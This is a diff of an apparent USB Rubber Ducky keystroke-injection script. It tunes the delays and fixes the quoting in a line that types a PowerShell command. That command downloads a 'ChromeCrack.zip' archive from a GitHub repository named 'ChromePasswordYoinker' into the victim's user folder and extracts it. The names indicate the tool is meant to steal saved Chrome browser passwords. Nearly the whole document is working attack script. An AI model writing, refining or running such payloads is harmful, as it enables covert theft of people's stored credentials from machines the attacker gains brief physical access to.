@@ -7,10 +7,14 @@ DELAY 800
 ENTER
 DELAY 800
 TAB
+DELAY 100
 TAB
+DELAY 100
 TAB
+DELAY 100
 TAB
 ENTER
+DELAY 100
 SPACE
 DELAY 800
 ALT y
@@ -20,7 +24,7 @@ DELAY 800
 STRING powershell
 ENTER
 DELAY 800
-STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile 'C:\Users\$env:UserName\ChromeCracker.zip'
+STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile "C:\Users\$env:UserName\ChromeCracker.zip"
 ENTER
 DELAY 800
 STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath C:\Users\$env:UserName\ChromeCracker -Force
